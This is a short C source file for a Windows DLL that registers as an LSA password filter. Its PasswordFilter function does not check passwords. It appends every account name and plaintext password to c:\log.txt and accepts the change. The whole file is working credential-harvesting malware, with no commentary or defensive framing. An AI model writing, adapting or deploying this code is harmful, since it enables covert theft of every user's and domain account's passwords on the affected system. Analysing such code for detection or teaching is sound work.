    
#include <windows.h>

#include <stdio.h>
#include <SubAuth.h>

BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation){
	FILE* pFile;
	int err = fopen_s(&pFile, "c:\\log.txt", "a+");
	if (err != 0){
		return FALSE;
	}
	fprintf(pFile, "%wZ:%wZ\r\n", AccountName, Password);
	fclose(pFile);
	return TRUE;
}

BOOLEAN __stdcall InitializeChangeNotify(void){
	return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword){
	return STATUS_SUCCESS;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){
	switch (ul_reason_for_call){
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}